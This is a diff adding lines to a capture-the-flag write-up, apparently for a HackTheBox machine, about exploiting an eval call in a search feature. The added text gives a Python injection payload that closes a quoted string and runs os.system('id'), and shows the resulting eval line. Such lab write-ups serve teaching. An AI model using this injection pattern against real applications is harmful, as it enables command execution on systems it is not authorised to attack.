@@ -46,4 +46,26 @@ Reading one of the github, it seems the vuln is at:
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1a5046fd-3c43-4817-9098-589e27c710e5)
 
 
-There's a eval usage, which allows us to inject bash command, 
+There's a eval usage, which allows us to inject bash command. But we can't just send --> `__import__('os').system('id')`, after tested the feature in normal way, seems we need to add `'` and wrap the python code with `str()`.
+
+> TESTING NORMAL WAY
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/677c944e-abcb-4b1a-ae32-60ecc1d11f0c)
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/651bc11c-53be-4a88-b50d-367ad49224d4)
+
+
+> OUR PAYLOAD
+
+```py
+') + str(__import__('os').system('id')) #
+```
+
+What it will look like:
+
+```py
+url = eval(Engine.<some_engine>.search('') + str(__import__('os').system('id')) #', copy_url={copy}, open_web={open})")
+```
+
+
